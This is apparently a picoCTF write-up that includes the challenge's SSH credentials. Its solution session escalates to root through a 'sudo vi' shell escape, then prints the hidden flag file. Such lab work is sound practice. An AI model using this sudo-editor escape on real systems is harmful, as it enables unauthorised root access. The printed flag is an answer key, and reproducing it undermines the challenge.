## Descripcion
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 62977 picoplayer@saturn.picoctf.net`Password: `vCR2tuwCRm`Can you login and read the root file?
## Solucion
```
ssh -p 62977 picoplayer@saturn.picoctf.net
cd /root
	-bash: cd: /root: Permission denied
sudo -l
	[sudo] password for picoplayer:
	Matching Defaults entries for picoplayer on challenge:
	env_reset,mail_badpass,secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User picoplayer may run the following commands on challenge:
	    (ALL) /usr/bin/vi
sudo vi
	[No write since last change]
root@challenge:~# dir -a
	.  ..  .bashrc  .flag.txt  .profile
cat .flag.txt
	picoCTF{uS1ng_v1m_3dit0r_ad091ce1}
```
## Notas

## Referencias

